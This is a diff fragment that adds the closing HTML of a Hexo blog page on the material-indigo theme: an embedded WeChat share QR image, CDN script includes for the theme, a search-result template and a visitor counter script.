+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACL0lEQVR42u3aQY7CMAwFUO5/aUaa1UhA+bYLmiYvq6pUJa8Ly459u8Xr/rv+Xr+683j/8T2vnnn89eSFgYFxWcb9cB1v9PgNxx/i+A353jAwMPZhVINs8mQeiHPwy/sYGBgYh88cB8pe2MXAwMCYMHrF6vEnwMDAwEgYeTLX+5vko3ypFsfAwLggo9cY+M71x/sbGBgY/55xL64kpJ6VDhZ2hYGBsTSjOioxOW7L35b/Y2ErGBgYl2X0DtqqxWrOa46XYWBgbMOYbCg5COsNn0UDahgYGNsweuGyOpyRp4PlWhwDA2MbRm8IrFrczkfHytMiGBgYl2VMAmJegn6iqVkeucDAwLgs46z2ZLUNkCeX0efAwMDYjFE9YkvKznlAj47bMDAwFmVUS8d5pjlpmkZhHQMDYxtGHvKqm85bEXlwx8DA2IFRHsNqBeUkfcxHxDAwMHZmVENknt4lm85HLgpdUwwMjIUY5260l/BVy+knARcDA2NRRnVbzdSt2PjsDWFgYGCsx5gfnOWhtnrQXxi8wMDA2IaRrMlQRa/lWchtMTAwFmVUE7U8pFY3Wg36b4pYDAyMhRiTgNsraHsB/c2xIAYGxtKMSUCsJoi9ZkC5MYCBgbEoY35wlieF+TBHtSGBgYGxA2MSBHuBeHJg92QnGBgYGEFh2WtV9sYvMDAwMHqDEd9JK09IDTEwMC7LmA9YVNsJk3CPgYGxG6NXOuZl7Xyo4qzBMgwMjAsyfgDNt4SaYYehxwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
